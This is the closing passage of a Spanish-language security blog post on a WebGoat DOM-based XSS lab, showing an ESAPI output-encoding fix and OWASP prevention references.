</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">filtrado</span><span class="o">=</span> <span class="nx">Encoder</span><span class="p">.</span><span class="nx">encodeForJS</span><span class="p">(</span><span class="nx">Encoder</span><span class="p">.</span><span class="nx">encodeForHTML</span><span class="p">(</span><span class="nx">param</span><span class="p">));</span>
<span class="k">this</span><span class="p">.</span><span class="nx">$el</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="dl">'</span><span class="s1">.lesson-content</span><span class="dl">'</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="dl">'</span><span class="s1">test:</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">filtrado</span><span class="p">);</span>
</pre></table></code></div></div><h1 id="referencias">Referencias:</h1><ol><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">Mitigación OWASP de XSS-DOM</a><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Mitigación OWASP de XSS</a><li><a href="https://github.com/ESAPI/owasp-esapi-js">OWASP-ESAPI-JS</a><li><a href="https://beefproject.com/">BeEF - The Browser Exploitation Framework Project</a></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/webgoat/'>WebGoat</a>, <a href='/categories/a7/'>A7</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a> <a href="/tags/xss-dom/" class="post-tag no-text-decoration" >xss-dom</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=WebGoat - A7 - (XSS) Cross Site Scripting - CSL&url=https://csl-labs.github.io/posts/webgoat-a7-xss/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=WebGoat - A7 - (XSS) Cross Site Scripting - CSL&u=https://csl-labs.github.io/posts/webgoat-a7-xss/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=WebGoat - A7 - (XSS) Cross Site Scripting - CSL&url=https://csl-labs.github.io/posts/webgoat-a7-xss/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizada Recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-nest/">HTB-NEST</a><li><a href="/posts/htb-openadmin/">HTB-OPENADMIN</a><li><a href="/posts/htb-sauna/">HTB-SAUNA</a></ul></div><div id="access-tags"> <span>Tags Relevantes</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/blind-sql/">blind sql</a> <a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/decompiling/">decompiling</a> <a class="post-tag" href="/tags/journalctl/">journalctl</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/nodejs/">NodeJS</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Tabla de Contenido</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Otras Publicaciones</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/webgoat-a1-path-traversal/"><div class="card-body"> <span class="timeago small" > Jan 7 <i class="unloaded">2021-01-07T14:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WebGoat - A1 - Path Traversal</h3><div class="text-muted small"><p> Introducción De forma breve, como lo indica la descripción de la vulnerabilidad el Path Traversal nos permite crear, leer, editar o eliminar archivos fuera la ubicación definida por el aplicativo; ...</p></div></div></a></div><div class="card"> <a href="/posts/webgoat-a1-sql-injection/"><div class="card-body"> <span class="timeago small" > Mar 10 <i class="unloaded">2021-03-10T14:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WebGoat - A1 - SQL Injection Advanced</h3><div class="text-muted small"><p> Introducción En esta ocasión vamos a trabajar con un laboratorio de SQL Injection - Advanced, en el que realizaremos 2 tipos de ataque SQL injection interesantes y de nivel medio, como lo son: S...</p></div></div></a></div><div class="card"> <a href="/posts/htb-nest/"><div class="card-body"> <span class="timeago small" > Nov 26, 2020 <i class="unloaded">2020-11-26T14:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-NEST</h3><div class="text-muted small"><p> Decripción del entorno Atacante OS Kali Linux IP 10.10.14.199 Maquina Objetivo OS Windows IP 10.10....</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/webgoat-a1-path-traversal/" class="btn btn-outline-primary"><p>WebGoat - A1 - Path Traversal</p></a> <a href="/posts/webgoat-a1-sql-injection/" class="btn btn-outline-primary"><p>WebGoat - A1 - SQL Injection Advanced</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/CsLcol">CSL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Tags Relevantes</h4><a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/blind-sql/">blind sql</a> <a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/decompiling/">decompiling</a> <a class="post-tag" href="/tags/journalctl/">journalctl</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/nodejs/">NodeJS</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://csl-labs.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script>
